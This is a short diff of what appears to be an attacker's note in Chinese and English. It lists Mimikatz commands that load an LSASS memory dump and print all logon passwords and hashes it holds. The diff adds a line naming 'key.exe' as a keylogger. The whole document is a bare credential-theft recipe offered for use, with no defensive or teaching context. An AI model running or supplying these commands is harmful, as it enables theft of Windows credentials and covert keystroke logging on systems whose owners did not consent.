@@ -3,3 +3,6 @@
 1、privilege::debug
 2、sekurlsa::minidump 1.bin
 3、sekurlsa::logonPasswords full
+
+
+key.exe 键盘记录
